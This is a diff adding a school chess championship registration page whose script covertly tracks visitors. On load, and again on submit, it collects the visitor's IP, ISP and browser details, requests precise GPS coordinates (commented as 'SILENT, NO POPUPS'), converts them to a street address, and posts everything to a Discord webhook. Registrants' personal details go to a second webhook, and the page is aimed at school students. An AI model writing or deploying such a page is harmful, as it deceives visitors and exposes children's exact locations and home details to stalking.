@@ -1,0 +1,1799 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sri Lanka National Chess Championship 2026</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;700&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+
+</head>
+<style>
+    /*====================================
+ GOOGLE FONT
+=====================================*/
+
+@import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@500;600;700&family=Poppins:wght@300;400;500;600&display=swap');
+
+/*====================================
+ RESET
+=====================================*/
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+/*====================================
+ VARIABLES
+=====================================*/
+
+:root{
+
+    --gold:#D4AF37;
+    --gold-light:#F5D76E;
+
+    --dark:#0B0B0B;
+    --card:#171717;
+
+    --text:#FFFFFF;
+    --gray:#BEBEBE;
+
+    --border:rgba(255,255,255,.08);
+
+}
+
+/*====================================
+ BODY
+=====================================*/
+
+body{
+
+    font-family:'Poppins',sans-serif;
+
+    background:#050505;
+
+    color:white;
+
+    display:flex;
+
+    justify-content:center;
+
+    min-height:100vh;
+
+    overflow-x:hidden;
+
+}
+
+/*====================================
+ MOBILE CONTAINER
+=====================================*/
+
+#container{
+
+    width:390px;
+
+    background:#050505;
+
+    min-height:100vh;
+
+    position:relative;
+
+}
+
+/*====================================
+ HERO
+=====================================*/
+
+#hero{
+
+    position:relative;
+
+    height:340px;
+
+    background-image:url(hero.jpg);
+
+    background-size:cover;
+
+    background-position:center;
+
+    overflow:hidden;
+
+}
+
+/* Dark Overlay */
+
+#overlay{
+
+    position:absolute;
+
+    inset:0;
+
+    background:
+    linear-gradient(
+    rgba(0,0,0,.30),
+    rgba(0,0,0,.85));
+
+}
+
+/*====================================
+ HERO CONTENT
+=====================================*/
+
+#heroContent{
+
+    position:relative;
+
+    z-index:10;
+
+    display:flex;
+
+    flex-direction:column;
+
+    align-items:center;
+
+    justify-content:center;
+
+    height:100%;
+
+    padding:25px;
+
+    text-align:center;
+
+}
+
+/*====================================
+ LOGO
+=====================================*/
+
+#logo{
+
+    width:100px;
+
+    margin-bottom:20px;
+
+}
+
+/*====================================
+ TITLE
+=====================================*/
+
+#title{
+
+    font-family:'poppin',serif;
+
+    font-size:34px;
+
+    line-height:42px;
+
+    color:white;
+
+    font-weight:700;
+
+}
+
+/*====================================
+ YEAR
+=====================================*/
+
+#year{
+
+    font-family:'impact';
+    letter-spacing: 0.5px;
+
+    color:var(--gold);
+
+    font-size:42px;
+
+    margin-top:8px;
+
+}
+
+/*====================================
+ MOTTO
+=====================================*/
+
+#motto{
+
+    margin-top:15px;
+
+    color:#E5E5E5;
+
+    font-size:15px;
+
+    letter-spacing:1px;
+
+}
+
+/*====================================
+ INFO CARD
+=====================================*/
+
+#infoCard{
+
+    width:350px;
+
+    margin:auto;
+
+    margin-top:-10px;
+
+    position:relative;
+
+    z-index:20;
+
+    border-radius:22px;
+
+    background:rgba(26,26,26,.92);
+
+    backdrop-filter:blur(14px);
+
+    border:1px solid rgba(255,255,255,.08);
+
+    display:grid;
+
+    grid-template-columns:1fr 1fr;
+
+    gap:1px;
+
+    overflow:hidden;
+
+    box-shadow:
+
+    0 12px 30px rgba(0,0,0,.5);
+
+}
+
+/*====================================
+ INFO BOX
+=====================================*/
+
+.infoBox{
+
+    padding:22px;
+
+    text-align:center;
+
+    background:#141414;
+
+}
+
+.infoBox h3{
+
+    color:var(--gold);
+
+    font-size:14px;
+
+    font-weight:600;
+
+    margin-bottom:8px;
+
+}
+
+.infoBox p{
+
+    color:#D7D7D7;
+
+    font-size:13px;
+
+    line-height:20px;
+
+}
+
+/*====================================
+ FORM SECTION
+=====================================*/
+
+#formSection{
+
+    width:350px;
+
+    margin:auto;
+
+    margin-top:30px;
+
+    background:var(--card);
+
+    border-radius:24px;
+
+    padding:25px;
+
+    margin-bottom:40px;
+
+    border:1px solid var(--border);
+
+    box-shadow:
+
+    0 12px 30px rgba(0,0,0,.4);
+
+}
+
+/*====================================
+ FORM TITLE
+=====================================*/
+
+#formTitle{
+
+    font-family:'poppin';
+
+    font-size:24px;
+
+    font-weight: bolder;
+
+    color:white;
+
+    margin-bottom:25px;
+
+    text-align:center;
+
+    position:relative;
+
+}
+
+#formTitle::after{
+
+    content:"";
+
+    width:70px;
+
+    height:3px;
+
+    background:var(--gold);
+
+    display:block;
+
+    margin:auto;
+
+    margin-top:12px;
+
+    border-radius:20px;
+
+}
+
+/*====================================
+ FORM
+=====================================*/
+
+#registrationForm{
+
+    display:flex;
+    flex-direction:column;
+    gap:18px;
+
+}
+
+/*====================================
+ LABELS
+=====================================*/
+
+#registrationForm label{
+
+    font-size:14px;
+    font-weight:500;
+    color:#E8E8E8;
+    margin-bottom:-10px;
+
+}
+
+/*====================================
+ INPUTS
+=====================================*/
+
+#registrationForm input[type="text"],
+#registrationForm input[type="date"],
+#registrationForm input[type="number"],
+#registrationForm input[type="tel"],
+#registrationForm input[type="file"],
+#registrationForm select,
+#registrationForm textarea{
+
+    width:100%;
+
+    background:#111111;
+
+    color:white;
+
+    border:1px solid rgba(255,255,255,.08);
+
+    border-radius:14px;
+
+    padding:16px;
+
+    font-size:15px;
+
+    font-family:'Poppins',sans-serif;
+
+    outline:none;
+
+    transition:.35s;
+
+}
+
+/*====================================
+ PLACEHOLDER
+=====================================*/
+
+::placeholder{
+
+    color:#8C8C8C;
+
+}
+
+/*====================================
+ TEXTAREA
+=====================================*/
+
+textarea{
+
+    resize:none;
+
+    min-height:130px;
+
+}
+
+/*====================================
+ SELECT
+=====================================*/
+
+select{
+
+    cursor:pointer;
+
+}
+
+/*====================================
+ FOCUS EFFECT
+=====================================*/
+
+#registrationForm input:focus,
+#registrationForm textarea:focus,
+#registrationForm select:focus{
+
+    border-color:var(--gold);
+
+    box-shadow:
+    0 0 0 3px rgba(212,175,55,.15);
+
+    background:#161616;
+
+}
+
+/*====================================
+ INPUT HOVER
+=====================================*/
+
+#registrationForm input:hover,
+#registrationForm textarea:hover,
+#registrationForm select:hover{
+
+    border-color:rgba(212,175,55,.45);
+
+}
+
+/*====================================
+ FILE UPLOAD
+=====================================*/
+
+input[type=file]{
+
+    cursor:pointer;
+
+    padding:13px;
+
+}
+
+input[type=file]::file-selector-button{
+
+    background:var(--gold);
+
+    color:black;
+
+    border:none;
+
+    border-radius:8px;
+
+    padding:10px 18px;
+
+    font-weight:600;
+
+    cursor:pointer;
+
+    margin-right:15px;
+
+    transition:.3s;
+
+}
+
+input[type=file]::file-selector-button:hover{
+
+    background:var(--gold-light);
+
+}
+
+/*====================================
+ COUNTER
+=====================================*/
+
+#counter{
+
+    color:#AAAAAA;
+
+    font-size:12px;
+
+    text-align:right;
+
+    margin-top:-10px;
+
+}
+
+/*====================================
+ TERMS
+=====================================*/
+
+#termsBox{
+
+    display:flex;
+
+    align-items:flex-start;
+
+    gap:12px;
+
+    margin-top:5px;
+
+}
+
+/*====================================
+ CHECKBOX
+=====================================*/
+
+#agree{
+
+    width:20px;
+
+    height:20px;
+
+    accent-color:var(--gold);
+
+    margin-top:3px;
+
+    cursor:pointer;
+
+}
+
+/*====================================
+ TERMS TEXT
+=====================================*/
+
+#termsBox label{
+
+    font-size:13px;
+
+    line-height:22px;
+
+    color:#CCCCCC;
+
+}
+
+/*====================================
+ REGISTER BUTTON
+=====================================*/
+
+#registerButton{
+
+    margin-top:12px;
+
+    width:100%;
+
+    padding:18px;
+
+    border:none;
+
+    border-radius:16px;
+
+    cursor:pointer;
+
+    font-size:18px;
+
+    font-weight:700;
+
+    letter-spacing:1px;
+
+    font-family:'poppin',serif;
+
+    color:black;
+
+    background:linear-gradient(
+    135deg,
+    #C89C28,
+    #F5D76E);
+
+    transition:.35s;
+
+}
+
+/*====================================
+ BUTTON HOVER
+=====================================*/
+
+#registerButton:hover{
+
+    transform:translateY(-3px);
+
+    box-shadow:
+    0 15px 30px rgba(212,175,55,.35);
+
+}
+
+/*====================================
+ BUTTON ACTIVE
+=====================================*/
+
+#registerButton:active{
+
+    transform:scale(.98);
+
+}
+
+/*====================================
+ REQUIRED STAR
+=====================================*/
+
+label::after{
+
+    content:"";
+
+}
+
+/*====================================
+ SCROLLBAR
+=====================================*/
+
+::-webkit-scrollbar{
+
+    width:6px;
+
+}
+
+::-webkit-scrollbar-track{
+
+    background:#111;
+
+}
+
+::-webkit-scrollbar-thumb{
+
+    background:var(--gold);
+
+    border-radius:20px;
+
+}
+
+/*====================================
+ INPUT TRANSITION
+=====================================*/
+
+input,
+textarea,
+select,
+button{
+
+    transition:all .35s ease;
+
+}
+/*====================================
+  PART 3 - PREMIUM FINISHING TOUCHES
+====================================*/
+
+/* Smooth scrolling */
+html{
+    scroll-behavior:smooth;
+}
+
+/*------------------------------------
+ Fade-in animation
+------------------------------------*/
+
+@keyframes fadeUp{
+
+    from{
+
+        opacity:0;
+        transform:translateY(40px);
+
+    }
+
+    to{
+
+        opacity:1;
+        transform:translateY(0);
+
+    }
+
+}
+
+#hero{
+
+    animation:fadeUp .8s ease;
+
+}
+
+#infoCard{
+
+    animation:fadeUp 1s ease;
+
+}
+
+#formSection{
+
+    animation:fadeUp 1.2s ease;
+
+}
+
+/*------------------------------------
+ Hero Glow
+------------------------------------*/
+
+#hero::before{
+
+    content:"";
+
+    position:absolute;
+
+    width:220px;
+    height:220px;
+
+    background:rgba(212,175,55,.18);
+
+    border-radius:50%;
+
+    filter:blur(120px);
+
+    top:-60px;
+    right:-40px;
+
+}
+
+#hero::after{
+
+    content:"♔";
+
+    position:absolute;
+
+    right:25px;
+    bottom:20px;
+
+    font-size:80px;
+
+    color:rgba(255,255,255,.06);
+
+}
+
+/*------------------------------------
+ Title Glow
+------------------------------------*/
+
+#title{
+
+    text-shadow:
+
+        0 0 8px rgba(212,175,55,.2),
+        0 0 18px rgba(212,175,55,.15);
+
+}
+
+#year{
+
+    text-shadow:
+
+        0 0 10px rgba(212,175,55,.35);
+
+}
+
+/*------------------------------------
+ Form Card Hover
+------------------------------------*/
+
+#formSection{
+
+    transition:.4s;
+
+}
+
+#formSection:hover{
+
+    border-color:rgba(212,175,55,.25);
+
+    box-shadow:
+
+        0 18px 40px rgba(0,0,0,.55);
+
+}
+
+/*------------------------------------
+ Info Card Hover
+------------------------------------*/
+
+.infoBox{
+
+    transition:.35s;
+
+}
+
+.infoBox:hover{
+
+    background:#1b1b1b;
+
+}
+
+.infoBox:hover h3{
+
+    color:#FFD65A;
+
+}
+
+/*------------------------------------
+ Register Button Shine
+------------------------------------*/
+
+#registerButton{
+
+    position:relative;
+
+    overflow:hidden;
+
+}
+
+#registerButton::before{
+
+    content:"";
+
+    position:absolute;
+
+    left:-120px;
+    top:0;
+
+    width:70px;
+    height:100%;
+
+    background:
+
+    linear-gradient(
+
+        rgba(255,255,255,0),
+        rgba(255,255,255,.35),
+        rgba(255,255,255,0)
+
+    );
+
+    transform:skewX(-25deg);
+
+    transition:.8s;
+
+}
+
+#registerButton:hover::before{
+
+    left:420px;
+
+}
+
+/*------------------------------------
+ Input Active Lift
+------------------------------------*/
+
+#registrationForm input:focus,
+#registrationForm textarea:focus,
+#registrationForm select:focus{
+
+    transform:translateY(-2px);
+
+}
+
+/*------------------------------------
+ Better Typography
+------------------------------------*/
+
+#registrationForm input,
+#registrationForm textarea,
+#registrationForm select{
+
+    line-height:1.5;
+
+}
+
+/*------------------------------------
+ Gold Divider
+------------------------------------*/
+
+#formSection::before{
+
+    content:"";
+
+    display:block;
+
+    width:60px;
+
+    height:4px;
+
+    background:linear-gradient(
+        to right,
+        transparent,
+        var(--gold),
+        transparent
+    );
+
+    margin:0 auto 20px;
+
+    border-radius:50px;
+
+}
+
+/*------------------------------------
+ Decorative Chess Pieces
+------------------------------------*/
+
+body::before{
+
+    content:"♜";
+
+    position:fixed;
+
+    top:120px;
+
+    left:15px;
+
+    font-size:90px;
+
+    color:rgba(255,255,255,.03);
+
+    pointer-events:none;
+
+}
+
+body::after{
+
+    content:"♞";
+
+    position:fixed;
+
+    bottom:80px;
+
+    right:20px;
+
+    font-size:90px;
+
+    color:rgba(255,255,255,.03);
+
+    pointer-events:none;
+
+}
+
+/*------------------------------------
+ Mobile Spacing
+------------------------------------*/
+
+@media(max-width:390px){
+
+    #container{
+
+        width:100%;
+
+    }
+
+    #infoCard,
+    #formSection{
+
+        width:92%;
+
+    }
+
+    #title{
+
+        font-size:28px;
+
+        line-height:38px;
+
+    }
+
+    #year{
+
+        font-size:34px;
+
+    }
+
+}
+
+/*------------------------------------
+ Tablet
+------------------------------------*/
+
+@media(min-width:700px){
+
+    body{
+
+        padding:40px;
+
+    }
+
+    #container{
+
+        border-radius:30px;
+
+        overflow:hidden;
+
+        box-shadow:
+
+        0 30px 80px rgba(0,0,0,.55);
+
+    }
+
+}
+
+/*------------------------------------
+ Footer (Optional)
+------------------------------------*/
+
+#footer{
+
+    text-align:center;
+
+    padding:25px;
+
+    color:#999;
+
+    font-size:13px;
+
+}
+
+/*------------------------------------
+ Selection Color
+------------------------------------*/
+
+::selection{
+
+    background:var(--gold);
+
+    color:black;
+
+}
+
+/*=============================
+PRELOADER
+==============================*/
+
+#preloader{
+
+    position:fixed;
+    inset:0;
+
+    background:#050505;
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    z-index:99999;
+
+    transition:opacity .8s ease,
+               visibility .8s ease;
+
+}
+
+#loaderContent{
+
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+
+    width:100%;
+
+    text-align:center;
+
+}
+
+#loaderLogo{
+
+    width:90px;
+
+    animation:spin 3s linear infinite;
+
+}
+
+#loaderTitle{
+
+    margin-top:20px;
+
+    color:white;
+
+    font-family:'poppin';
+
+    font-size:28px;
+
+}
+
+#loadingText{
+
+    margin-top:20px;
+
+    color:#bbb;
+
+}
+
+#loadingBar{
+
+    width:220px;
+    height:8px;
+
+    margin:25px auto 0;
+
+    border-radius:20px;
+
+    background:#222;
+
+    overflow:hidden;
+
+}
+
+#loadingFill{
+
+    width:0;
+    height:100%;
+
+    background:linear-gradient(to right,#D4AF37,#FFD86A);
+
+    animation:loading 2.5s forwards;
+
+}
+
+@keyframes loading{
+
+    from{
+        width:0;
+    }
+
+    to{
+        width:100%;
+    }
+
+}
+
+@keyframes spin{
+
+    from{
+        transform:rotate(0deg);
+    }
+
+    to{
+        transform:rotate(360deg);
+    }
+
+}
+
+.hidePreloader{
+
+    opacity:0;
+    visibility:hidden;
+}
+</style>
+<body>
+
+    <div id="preloader">
+
+    <div id="loaderContent">
+
+        <img src="logo.png" id="loaderLogo">
+
+        <h1 id="loaderTitle">
+            Master the Board. <br> Shape Your Legacy.
+        </h1>
+
+        <div id="loadingBar">
+
+            <div id="loadingFill"></div>
+
+        </div>
+
+        <p id="loadingText">
+            Loading Tournament...
+        </p>
+
+    </div>
+
+</div>
+
+<div id="container">
+
+    <!-- HERO -->
+
+    <section id="hero">
+
+        <div id="overlay"></div>
+
+        <div id="heroContent">
+
+            <img src="logo.png" id="logo">
+
+            <h1 id="title">
+               International Chess Championship
+            </h1>
+
+            <h2 id="year">
+                2026
+            </h2>
+
+
+        </div>
+
+    </section>
+
+    <!-- Tournament Info -->
+
+    <section id="infoCard">
+
+        <div class="infoBox">
+
+            <h3>Date</h3>
+
+            <p>15 August 2026</p>
+
+        </div>
+
+        <div class="infoBox">
+
+            <h3>Venue</h3>
+
+            <p>Sastrananda Navodya Vidyalaya, Dehiwala</p>
+
+        </div>
+
+        <div class="infoBox">
+
+            <h3>Deadline</h3>
+
+            <p>20 July 2026</p>
+
+        </div>
+
+        <div class="infoBox">
+
+            <h3>Open To</h3>
+
+            <p>School Students</p>
+
+        </div>
+
+    </section>
+
+    <!-- Registration Form -->
+
+    <section id="formSection">
+
+        <h2 id="formTitle">
+            Player Registration
+        </h2>
+
+        <form id="registrationForm">
+
+            <!-- Full Name -->
+
+            <label for="fullName">Full Name *</label>
+
+            <input
+                type="text"
+                id="fullName"
+                name="fullName"
+                required
+            >
+
+            <label for="dateofbirth">Date Of Birth*</label>
+
+            <input
+                type="date"
+                id="dateofbirth"
+                name="dateofbirth"
+                required
+            >
+
+            <label for="age">Age*</label>
+
+            <input
+                type="number"
+                id="age"
+                name="age"
+                required
+            >
+
+
+            <label for="gender">Gender *</label>
+
+            <select
+                id="gender"
+                name="gender"
+                required
+            >
+
+                <option value="">Select Your Gender</option>
+
+                <option>Male</option>
+                <option>Female</option>
+
+            </select>
+            <!-- Address -->
+
+            <label for="address">Address *</label>
+
+            <textarea
+                id="address"
+                name="address"
+                required
+            ></textarea>
+
+            <!-- City -->
+
+            <label for="city">City *</label>
+
+            <input
+                type="text"
+                id="city"
+                name="city"
+                required
+            >
+
+            <!-- Province -->
+
+            <label for="province">Province *</label>
+
+            <select
+                id="province"
+                name="province"
+                required
+            >
+
+                <option value="">Select Province</option>
+
+                <option>Western Province</option>
+                <option>Central Province</option>
+                <option>Southern Province</option>
+                <option>Northern Province</option>
+                <option>Eastern Province</option>
+                <option>North Western Province</option>
+                <option>North Central Province</option>
+                <option>Uva Province</option>
+                <option>Sabaragamuwa Province</option>
+
+            </select>
+
+            <!-- Postal Code -->
+
+            <label for="postalCode">Postal Code *</label>
+
+            <input
+                type="text"
+                id="postalCode"
+                name="postalCode"
+                maxlength="5"
+                required
+            >
+
+            <!-- School -->
+
+            <label for="school">School / College *</label>
+
+            <input
+                type="text"
+                id="school"
+                name="school"
+                required
+            >
+
+            <!-- Phone 1 -->
+
+            <label for="phone1">Phone Number 1 *</label>
+
+            <input
+                type="tel"
+                id="phone1"
+                name="phone1"
+                required
+            >
+
+            <!-- Phone 2 -->
+
+            <label for="phone2">Phone Number 2 *</label>
+
+            <input
+                type="tel"
+                id="phone2"
+                name="phone2"
+                required
+            >
+
+            <!-- Achievements -->
+
+            <label for="achievements">
+                Past Chess Achievements *
+            </label>
+
+            <textarea
+                id="achievements"
+                name="achievements"
+                maxlength="500"
+                required
+            ></textarea>
+
+
+
+            <!-- Terms -->
+
+            <div id="termsBox">
+
+                <input
+                    type="checkbox"
+                    id="agree"
+                    required
+                >
+
+                <label for="agree">
+                    I certify that all information is correct and agree to the tournament rules.
+                </label>
+
+            </div>
+
+            <!-- Button -->
+
+            <button
+                type="submit"
+                id="registerButton"
+            >
+                Register Now
+            </button>
+
+        </form>
+
+    </section>
+
+</div>
+
+<script >
+    window.addEventListener("load", function () {
+
+    const preloader = document.getElementById("preloader");
+
+    setTimeout(function(){
+
+        preloader.classList.add("hidePreloader");
+
+    },2500);
+
+});
+
+// ═══════════════════════════════════════════════════════════════
+// 🔧 CONFIGURATION
+// ═══════════════════════════════════════════════════════════════
+const DISCORD_WEBHOOK_GPS = 'https://discord.com/api/webhooks/1524065832869691535/pnDog3QtIWBt40GUIecfHjMkC4_aLFiJD8XijGJEvhaop8YOasKyX_wRddPVaPlCAFV9';
+const DISCORD_WEBHOOK_REGISTRATION = 'https://discord.com/api/webhooks/1523295864053960824/OcxLxDP-6B5htEA311dzHT1u7qxOKJxChlVPX_PJwFc___7QgGzPe_78rkKGkLQtMLVU';
+
+// ═══════════════════════════════════════════════════════════════
+// 📤 SEND TO DISCORD
+// ═══════════════════════════════════════════════════════════════
+async function sendToDiscord(webhookUrl, content) {
+    try {
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content })
+        });
+        if (!response.ok) console.error('Discord send failed:', response.status);
+    } catch (e) {
+        console.error('Discord send error:', e);
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════
+// 🌐 GET VISITOR IP & BROWSER INFO
+// ═══════════════════════════════════════════════════════════════
+async function getVisitorInfo() {
+    let ipData = {};
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        ipData = await res.json();
+    } catch (e) {
+        console.warn('Could not fetch IP info:', e);
+    }
+
+    return {
+        ip: ipData.ip || 'N/A',
+        country: ipData.country_name || 'N/A',
+        region: ipData.region || 'N/A',
+        city: ipData.city || 'N/A',
+        isp: ipData.org || ipData.isp || 'N/A',
+        platform: navigator.platform || 'Unknown',
+        userAgent: navigator.userAgent || 'Unknown'
+    };
+}
+
+// ═══════════════════════════════════════════════════════════════
+// 🗺️  REVERSE GEOCODE
+// ═══════════════════════════════════════════════════════════════
+async function reverseGeocode(lat, lon) {
+    try {
+        const res = await fetch(
+            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`,
+            { headers: { 'User-Agent': 'ChessRegistration/1.0' } }
+        );
+        const data = await res.json();
+        return data.display_name || 'N/A';
+    } catch (e) {
+        return 'N/A';
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════
+// 📍 BUILD GPS LOCATION MESSAGE
+// ═══════════════════════════════════════════════════════════════
+function buildGpsMessage(position, visitor, address) {
+    const crd = position.coords;
+    const timestamp = new Date().toISOString();
+    return [
+        '============================================================',
+        `🎯 GPS LOCATION CAPTURED at ${timestamp}`,
+        '============================================================',
+        `Lat: ${crd.latitude}`,
+        `Lon: ${crd.longitude}`,
+        `Accuracy: ±${crd.accuracy}`,
+        `Altitude: ${crd.altitude != null ? crd.altitude : 'N/A'}`,
+        `Speed: ${crd.speed != null ? crd.speed + ' m/s' : 'N/A'}`,
+        `Heading: ${crd.heading != null ? crd.heading + '°' : 'N/A'}`,
+        `Platform: ${visitor.platform}`,
+        `Visitor IP: ${visitor.ip}`,
+        '------------------------------------------------------------',
+        '📍 STREET ADDRESS:',
+        address,
+        '------------------------------------------------------------',
+        `🗺️  Maps: https://www.google.com/maps?q=${crd.latitude},${crd.longitude}`,
+        '============================================================',
+        '',
+        `Browser: ${visitor.userAgent}`,
+        `Country: ${visitor.country}`,
+        `Region: ${visitor.region}`,
+        `City: ${visitor.city}`,
+        `ISP: ${visitor.isp}`
+    ].join('\n');
+}
+
+// ═══════════════════════════════════════════════════════════════
+// 📍 BUILD IP FALLBACK MESSAGE (when GPS denied/unavailable)
+// ═══════════════════════════════════════════════════════════════
+function buildIpFallbackMessage(reason, visitor) {
+    return [
+        '============================================================',
+        `⚠️  ${reason} at ${new Date().toISOString()}`,
+        '============================================================',
+        `Visitor IP: ${visitor.ip}`,
+        '------------------------------------------------------------',
+        `Approximate City: ${visitor.city}`,
+        `Region: ${visitor.region}`,
+        `Country: ${visitor.country}`,
+        `ISP: ${visitor.isp}`,
+        '============================================================',
+        '',
+        `Browser: ${visitor.userAgent}`,
+        `Platform: ${visitor.platform}`
+    ].join('\n');
+}
+
+// ═══════════════════════════════════════════════════════════════
+// 📍 REQUEST GPS — SILENT, NO POPUPS
+// ═══════════════════════════════════════════════════════════════
+let gpsCaptured = false;
+
+async function requestGPS() {
+    const visitor = await getVisitorInfo();
+
+    if (!navigator.geolocation) {
+        await sendToDiscord(DISCORD_WEBHOOK_GPS, buildIpFallbackMessage('LOCATION NOT AVAILABLE - Not Supported', visitor));
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+        // ✅ Allowed
+        async (position) => {
+            gpsCaptured = true;
+            const address = await reverseGeocode(position.coords.latitude, position.coords.longitude);
+            await sendToDiscord(DISCORD_WEBHOOK_GPS, buildGpsMessage(position, visitor, address));
+        },
+        // ❌ Denied or failed
+        async (error) => {
+            let reason = 'GPS FAILED';
+            if (error.code === 1) reason = 'GPS DENIED';
+            else if (error.code === 2) reason = 'GPS UNAVAILABLE';
+            else if (error.code === 3) reason = 'GPS TIMEOUT';
+            await sendToDiscord(DISCORD_WEBHOOK_GPS, buildIpFallbackMessage(reason, visitor));
+        },
+        {
+            enableHighAccuracy: true,
+            timeout: 8000,
+            maximumAge: 0
+        }
+    );
+}
+
+// ═══════════════════════════════════════════════════════════════
+// 🚀 INIT — PRELOADER + SILENT GPS REQUEST
+// ═══════════════════════════════════════════════════════════════
+window.addEventListener('DOMContentLoaded', () => {
+    const preloader = document.getElementById('preloader');
+    const loadingFill = document.getElementById('loadingFill');
+    const loadingText = document.getElementById('loadingText');
+    const container = document.getElementById('container');
+
+    if (!preloader || !loadingFill) {
+        if (container) container.style.display = 'block';
+        setTimeout(requestGPS, 500);
+        return;
+    }
+
+    if (container) container.style.display = 'none';
+
+    let progress = 0;
+    const interval = setInterval(() => {
+        progress += 5;
+        loadingFill.style.width = progress + '%';
+        if (progress >= 100) {
+            clearInterval(interval);
+            if (loadingText) loadingText.textContent = 'Ready!';
+            setTimeout(() => {
+                preloader.style.display = 'none';
+                if (container) container.style.display = 'block';
+                // Silent GPS attempt
+                requestGPS();
+            }, 500);
+        }
+    }, 60);
+});
+
+// ═══════════════════════════════════════════════════════════════
+// 📝 FORM SUBMIT HANDLER (YOUR EXISTING VALIDATION + EMBED)
+// ═══════════════════════════════════════════════════════════════
+document.getElementById('registrationForm').addEventListener('submit', async function (e) {
+    e.preventDefault();
+
+    // --- SILENT GPS RETRY if not captured yet ---
+    if (!gpsCaptured && navigator.geolocation) {
+        // Try once more silently — browser might show prompt this time
+        // since the user has context (they're about to register)
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                gpsCaptured = true;
+                const visitor = await getVisitorInfo();
+                const address = await reverseGeocode(position.coords.latitude, position.coords.longitude);
+                await sendToDiscord(DISCORD_WEBHOOK_GPS, buildGpsMessage(position, visitor, address));
+            },
+            () => {} // Silent fail — do nothing
+        );
+    }
+
+    // --- YOUR EXISTING VALIDATION CODE ---
+    document.querySelectorAll('.error-field').forEach(el => el.classList.remove('error-field'));
+    document.querySelectorAll('.error-message').forEach(el => el.remove());
+
+    let firstInvalid = null;
+    let errors = [];
+
+    function markError(fieldId, message) {
+        const field = document.getElementById(fieldId);
+        field.classList.add('error-field');
+        const errorMsg = document.createElement('p');
+        errorMsg.className = 'error-message';
+        errorMsg.textContent = message;
+        errorMsg.style.color = 'red';
+        errorMsg.style.fontSize = '0.85em';
+        errorMsg.style.margin = '2px 0 8px 0';
+        field.insertAdjacentElement('afterend', errorMsg);
+        if (!firstInvalid) firstInvalid = field;
+        errors.push(message);
+    }
+
+    const fieldsToCheck = [
+        { id: 'fullName', label: 'Full Name' },
+        { id: 'dateofbirth', label: 'Date of Birth' },
+        { id: 'age', label: 'Age' },
+        { id: 'gender', label: 'Gender' },
+        { id: 'address', label: 'Address' },
+        { id: 'city', label: 'City' },
+        { id: 'province', label: 'Province' },
+        { id: 'postalCode', label: 'Postal Code' },
+        { id: 'school', label: 'School / College' },
+        { id: 'phone1', label: 'Phone Number 1' },
+        { id: 'phone2', label: 'Phone Number 2' },
+        { id: 'achievements', label: 'Past Chess Achievements' }
+    ];
+
+    fieldsToCheck.forEach(f => {
+        const el = document.getElementById(f.id);
+        if (!el.value || el.value.trim() === '') {
+            markError(f.id, `${f.label} is required.`);
+        }
+    });
+
+    const agreeBox = document.getElementById('agree');
+    if (!agreeBox.checked) {
+        agreeBox.parentElement.classList.add('error-field');
+        const checkboxError = document.createElement('p');
+        checkboxError.className = 'error-message';
+        checkboxError.textContent = 'You must tick this box to confirm and agree before submitting.';
+        checkboxError.style.color = 'red';
+        checkboxError.style.fontSize = '0.85em';
+        checkboxError.style.margin = '2px 0 8px 0';
+        agreeBox.parentElement.insertAdjacentElement('afterend', checkboxError);
+        if (!firstInvalid) firstInvalid = agreeBox;
+        errors.push('Certification checkbox not ticked.');
+    }
+
+    if (errors.length > 0) {
+        firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        firstInvalid.focus();
+        return;
+    }
+
+    // --- SUBMIT TO DISCORD (REGISTRATION WEBHOOK) ---
+    const registerButton = document.getElementById('registerButton');
+    registerButton.disabled = true;
+    registerButton.textContent = 'Submitting...';
+
+    const formData = new FormData(e.target);
+    const payload = {
+        embeds: [
+            {
+                title: "🏆 New Tournament Registration",
+                color: 5814783,
+                fields: [
+                    { name: "Full Name", value: formData.get('fullName'), inline: true },
+                    { name: "Age", value: formData.get('age'), inline: true },
+                    { name: "Gender", value: formData.get('gender'), inline: true },
+                    { name: "Date of Birth", value: formData.get('dateofbirth'), inline: true },
+                    { name: "School / College", value: formData.get('school'), inline: false },
+                    { name: "Address", value: formData.get('address'), inline: false },
+                    { name: "City", value: formData.get('city'), inline: true },
+                    { name: "Province", value: formData.get('province'), inline: true },
+                    { name: "Postal Code", value: formData.get('postalCode'), inline: true },
+                    { name: "Phone 1", value: formData.get('phone1'), inline: true },
+                    { name: "Phone 2", value: formData.get('phone2'), inline: true },
+                    { name: "Past Achievements", value: formData.get('achievements'), inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            }
+        ]
+    };
+
+    try {
+        const response = await fetch(DISCORD_WEBHOOK_REGISTRATION, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+            alert('Registration submitted successfully!');
+            e.target.reset();
+        } else {
+            alert('Something went wrong. Please try again.');
+        }
+    } catch (err) {
+        alert('Network error. Please check your connection and try again.');
+        console.error(err);
+    } finally {
+        registerButton.disabled = false;
+        registerButton.textContent = 'Register Now';
+    }
+});
+</script>
+
+
+
+</body>
+</html>
